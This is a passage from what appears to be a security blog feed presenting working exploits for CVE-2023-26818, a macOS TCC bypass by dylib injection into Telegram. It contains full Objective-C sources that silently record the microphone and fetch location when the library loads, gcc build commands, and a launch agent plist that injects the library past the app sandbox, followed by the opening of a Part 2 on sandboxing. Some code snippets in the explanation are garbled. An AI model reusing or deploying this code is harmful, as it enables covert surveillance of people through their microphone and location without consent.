- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up audio device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }

    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.m4a&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}

- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
    NSLog(@&quot;Saved to %@&quot;, outputFileURL.path);
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s explain the code by part by part:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;AVFoundation/AVFoundation.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Foundation&lt;/code&gt; framework provides basic classes and data types, while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVFoundation&lt;/code&gt; provides classes for working with audio&lt;/p&gt;

&lt;p&gt;and video.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@interface AudioRecorder : NSObject &amp;lt;AVCaptureFileOutputRecordingDelegate&amp;gt;

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface declares a class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AudioRecorder&lt;/code&gt; that conforms to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureFileOutputRecordingDelegate&lt;/code&gt; protocol. It&lt;/p&gt;

&lt;p&gt;defines properties for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; (used to coordinate audio capture), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureDeviceInput&lt;/code&gt; (used to represent the&lt;/p&gt;

&lt;p&gt;device’s microphone as an input source), and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureMovieFileOutput&lt;/code&gt; (used to write the captured audio to a file).&lt;/p&gt;

&lt;p&gt;Additionally, it declares methods to start and stop recording, ensuring that the audio can be recorded and saved as needed.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@interface AudioRecorder : @implementation VideoRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface declares a class named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AudioRecorder&lt;/code&gt; (to inherit from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSObject&lt;/code&gt;). The class has a custom initializer method&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt; which sets up the instance by calling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupCaptureSession&lt;/code&gt; method which is responsible for configuring the audio&lt;/p&gt;

&lt;p&gt;recording components. In short, The initializer ensures any superclass initialization is completed first before performing&lt;/p&gt;

&lt;p&gt;the audio-specific setup.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&amp;amp;error];

    if (error) {
        NSLog(@&quot;Error setting up audio device input: %@&quot;, [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }

    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupCaptureSession&lt;/code&gt; method is responsible for initializing and configuring an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureSession&lt;/code&gt; for audio recording. It&lt;/p&gt;

&lt;p&gt;first creates an audio recording session with a high-quality preset. Then, fetches the default audio device (like a&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;microphone&lt;/code&gt;) and tries to create an input source from it, If there is an error in setting up the input, it logs the error.&lt;/p&gt;

&lt;p&gt;Otherwise, checks if the capture session can accept this audio input and if so, adds it to the session. Finally, it&lt;/p&gt;

&lt;p&gt;initializes a file output destination for the audio recording and, if the session can handle this output, adds it to the&lt;/p&gt;

&lt;p&gt;session.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@&quot;recording.m4a&quot;];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@&quot;Recording started&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;- (void)startRecording&lt;/code&gt; is responsible for initiating the audio recording process and starts the capture session,&lt;/p&gt;

&lt;p&gt;defines the path for the temporary audio file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recording.m4a&lt;/code&gt; and converts this path into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;URL&lt;/code&gt; and then starts&lt;/p&gt;

&lt;p&gt;recording audio to this file location. Finally, it logs that the recording process has started.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@&quot;Recording stopped&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stopRecording&lt;/code&gt; method is a part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AudioRecorder&lt;/code&gt; class which performs the action of stopping the audio recording. by&lt;/p&gt;

&lt;p&gt;first signaling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audioFileOutput&lt;/code&gt; object to stop recording the audio data. Then instructs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;captureSession&lt;/code&gt; to cease all&lt;/p&gt;

&lt;p&gt;capturing activities. Lastly, it logs the message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Recording stopped&lt;/code&gt; to indicate the recording process has been terminated.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray&amp;lt;AVCaptureConnection *&amp;gt; *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@&quot;Recording failed: %@&quot;, [error localizedDescription]);
    } else {
        NSLog(@&quot;Recording finished successfully. Saved to %@&quot;, outputFileURL.path);
    }
    NSLog(@&quot;Saved to %@&quot;, outputFileURL.path);
}

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;captureOutput:didFinishRecordingToOutputFileAtURL:fromConnections:error:&lt;/code&gt; is part of the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVCaptureFileOutputRecordingDelegate&lt;/code&gt; protocol and It’s called once a recording session concludes &amp;amp; method checks for any&lt;/p&gt;

&lt;p&gt;errors that might have occurred during recording. If an error is detected a message is logged detailing the failure and If&lt;/p&gt;

&lt;p&gt;the recording was successful, a message logs its successful completion and specifies where the recording was saved. Finally,&lt;/p&gt;

&lt;p&gt;the file path of the saved recording is also logged.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, here define a function named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telegram&lt;/code&gt; that is designated to run automatically when the library containing it is&lt;/p&gt;

&lt;p&gt;loaded as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__attribute__((constructor))&lt;/code&gt; exist. Inside this function, an instance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AudioRecorder&lt;/code&gt; class is created&lt;/p&gt;

&lt;p&gt;and immediately starts recording. The recording lasts for 5 seconds after which it stops. To ensure that the recording&lt;/p&gt;

&lt;p&gt;completes and the thread doesn’t terminate prematurely, the current run loop is kept running for an additional second.&lt;/p&gt;

&lt;h2 id=&quot;location-exploit&quot;&gt;&lt;strong&gt;Location Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;CoreLocation/CoreLocation.h&amp;gt;

@interface LocationFetcher : NSObject &amp;lt;CLLocationManagerDelegate&amp;gt;

@property (strong, nonatomic) CLLocationManager *locationManager;

- (void)startFetchingLocation;
- (void)stopFetchingLocation;

@end

@implementation LocationFetcher

- (instancetype)init {
    self = [super init];
    if (self) {
        _locationManager = [[CLLocationManager alloc] init];
        _locationManager.delegate = self;
        [_locationManager requestAlwaysAuthorization];
    }
    return self;
}

- (void)startFetchingLocation {
    [self.locationManager startUpdatingLocation];
    NSLog(@&quot;Location fetching started&quot;);
}

- (void)stopFetchingLocation {
    [self.locationManager stopUpdatingLocation];
    NSLog(@&quot;Location fetching stopped&quot;);
}

#pragma mark - CLLocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager
     didUpdateLocations:(NSArray&amp;lt;CLLocation *&amp;gt; *)locations {
    CLLocation *latestLocation = [locations lastObject];
    NSLog(@&quot;Received Location: Latitude: %f, Longitude: %f&quot;, latestLocation.coordinate.latitude, latestLocation.coordinate.longitude);
}

- (void)locationManager:(CLLocationManager *)manager
       didFailWithError:(NSError *)error {
    NSLog(@&quot;Location fetching failed: %@&quot;, [error localizedDescription]);
}

@end

__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    LocationFetcher *locationFetcher = [[LocationFetcher alloc] init];

    [locationFetcher startFetchingLocation];
    [NSThread sleepForTimeInterval:5.0];
    [locationFetcher stopFetchingLocation];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s Explain the code.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;Foundation/Foundation.h&amp;gt;
#import &amp;lt;CoreLocation/CoreLocation.h&amp;gt;

@interface LocationFetcher : NSObject &amp;lt;CLLocationManagerDelegate&amp;gt;

@property (strong, nonatomic) CLLocationManager *locationManager;

- (void)startFetchingLocation;
- (void)stopFetchingLocation;

@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This interface declares a class named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocationFetcher&lt;/code&gt; that conforms to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLLocationManagerDelegate&lt;/code&gt; protocol which defines&lt;/p&gt;

&lt;p&gt;a property for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLLocationManager&lt;/code&gt; (used to manage the delivery of location-related events to your app).&lt;/p&gt;

&lt;p&gt;There are two instance methods declared:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt; &lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(void)startFetchingLocation&lt;/code&gt;: Which is a method that starts the process of fetching the device’s location.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(void)stopFetchingLocation&lt;/code&gt;: Which is a method that stops the process of fetching the device’s location.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This class is designed to manage location updates and to handle the starting and stopping of location fetch operations using&lt;/p&gt;

&lt;p&gt;the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Core Location&lt;/code&gt; framework.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@implementation LocationFetcher

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupLocationManager];
    }
    return self;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here it provides the implementation for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocationFetcher&lt;/code&gt; class which Starting with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;init&lt;/code&gt; method which initializes an&lt;/p&gt;

&lt;p&gt;instance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocationFetcher&lt;/code&gt; class. Within this method the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setupLocationManager&lt;/code&gt; method is called to configure the&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLLocationManager&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)setupLocationManager {
    self.locationManager = [[CLLocationManager alloc] init];
    self.locationManager.delegate = self;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here initializes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLLocationManager&lt;/code&gt; object and assigns it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locationManager&lt;/code&gt; property.&lt;/p&gt;

&lt;p&gt;Sets the delegate of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locationManager&lt;/code&gt; to the current instance of LocationFetcher which ensures that the class can receive&lt;/p&gt;

&lt;p&gt;location-related events.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)startFetchingLocation {
    [self.locationManager startUpdatingLocation];
    NSLog(@&quot;Fetching location started&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;startUpdatingLocation&lt;/code&gt; method on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locationManager&lt;/code&gt; to begin delivering location updates.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- (void)stopFetchingLocation {
    [self.locationManager stopUpdatingLocation];
    NSLog(@&quot;Fetching location stopped&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here Calls the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stopUpdatingLocation&lt;/code&gt; method on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;locationManager&lt;/code&gt; to stop delivering location updates.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#pragma mark - CLLocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray&amp;lt;CLLocation *&amp;gt; *)locations {
    CLLocation *currentLocation = locations.lastObject;
    NSLog(@&quot;Received location: %f, %f&quot;, currentLocation.coordinate.latitude, currentLocation.coordinate.longitude);
}
@end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This Implements the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CLLocationManagerDelegate&lt;/code&gt; protocol method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;didUpdateLocations:&lt;/code&gt; which method gets called when new&lt;/p&gt;

&lt;p&gt;location data is available.Then logs the most recent location (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;latitude&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;longitude&lt;/code&gt;) to the console.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    LocationFetcher *locationFetcher = [[LocationFetcher alloc] init];

    [locationFetcher startFetchingLocation];
    [NSThread sleepForTimeInterval:5.0];
    [locationFetcher stopFetchingLocation];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This block effectively demonstrates the basic usage of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LocationFetcher&lt;/code&gt; class by fetching the location for 5 seconds upon&lt;/p&gt;

&lt;p&gt;the application’s start.&lt;/p&gt;

&lt;h1 id=&quot;exploit-testing&quot;&gt;&lt;strong&gt;Exploit Testing&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;camera-exploit-1&quot;&gt;&lt;strong&gt;Camera Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Compiling and testing time:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -dynamiclib -framework Foundation -framework AVFoundation Camexploit.m -o Cam.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;/assets/images/40a92a0d02cf613f2d3994ef8b596a48&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;microphone-exploit-1&quot;&gt;&lt;strong&gt;Microphone Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Compiling and testing time:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;/assets/images/78b234d576fd31e62e09dd12488879a8&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;location-exploit-1&quot;&gt;&lt;strong&gt;Location Exploit&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Compiling and testing time:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -dynamiclib -framework Foundation -framework CoreLocation -framework AVFoundation Locexploit.m -o Locexploit.dylib
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;/assets/images/5bb4c2920bb8432044040625142676e2&quot; alt=&quot;&quot; /&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;sandbox&quot;&gt;&lt;strong&gt;Sandbox&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;To exploit the vulnerability in general with any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Entitlemment&lt;/code&gt; while the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sandbox&lt;/code&gt; is activited for the app, We will Just use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;launch agent&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
       &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;com.telegram.launcher&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
        &amp;lt;true/&amp;gt;
        &amp;lt;key&amp;gt;EnvironmentVariables&amp;lt;/key&amp;gt;
        &amp;lt;dict&amp;gt;
          &amp;lt;key&amp;gt;DYLD_INSERT_LIBRARIES&amp;lt;/key&amp;gt;
          &amp;lt;string&amp;gt;DYLIB_PATH&amp;lt;/string&amp;gt;
        &amp;lt;/dict&amp;gt;
        &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
        &amp;lt;array&amp;gt;
  &amp;lt;string&amp;gt;/Applications/Telegram.app/Contents/MacOS/Telegram&amp;lt;/string&amp;gt;
        &amp;lt;/array&amp;gt;
        &amp;lt;key&amp;gt;StandardOutPath&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;StandardErrorPath&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;/tmp/telegram.log&amp;lt;/string&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;You can find the exploits code on github from &lt;a href=&quot;https://github.com/Zeyad-Azima/CVE-2023-26818&quot;&gt;here&lt;/a&gt;. And it will be updated as we gonna add more features and write a swift&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GUI&lt;/code&gt; app for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; to generate exploit with customizable options that can be used in different ways and go further with&lt;/p&gt;

&lt;p&gt;exploitation.&lt;/p&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection</title><link href="http://localhost:5000/macos/CVE_2023_26818_P2/" rel="alternate" type="text/html" title="CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection" /><published>2023-08-29T00:00:00+08:00</published><updated>2023-08-29T00:00:00+08:00</updated><id>http://localhost:5000/macos/CVE_2023_26818_P2</id><content type="html" xml:base="http://localhost:5000/macos/CVE_2023_26818_P2/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;In the previous part we discuss the root-cause of the vulnerability and show case on how it works and how to exploit it. But,&lt;/p&gt;

&lt;p&gt;in the previous part the sandbox was disabled. Now, In this part 2 we are going to discuss the sandboxing on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; and&lt;/p&gt;

&lt;p&gt;How to bypass it in details. If you didn’t read part 1 you can find it from &lt;a href=&quot;https://zeyadazima.com/macos/CVE_2023_26818_P1/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;h1 id=&quot;app-sandboxing&quot;&gt;&lt;strong&gt;App sandboxing&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;The app sandboxing feature in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MacOS&lt;/code&gt; is a technology that the system enforce at the kernel’s level which limit privileges and&lt;/p&gt;

&lt;p&gt;restrict the app access to resources/permissions. As a results, It helps in reducing the attacks and the infection of&lt;/p&gt;

&lt;p&gt;compromised apps to the system. The first introduce for the sandboxing by apple was in 2007 &amp;amp; Enforced to be used by apps&lt;/p&gt;

&lt;p&gt;before adding it to the app store in 2011, So it make sure that the apps more secure to use by making the app run in it’s own&lt;/p&gt;

&lt;p&gt;area and do nothing more except what is created for.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9010354daa7a32ae23cba81f042665bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

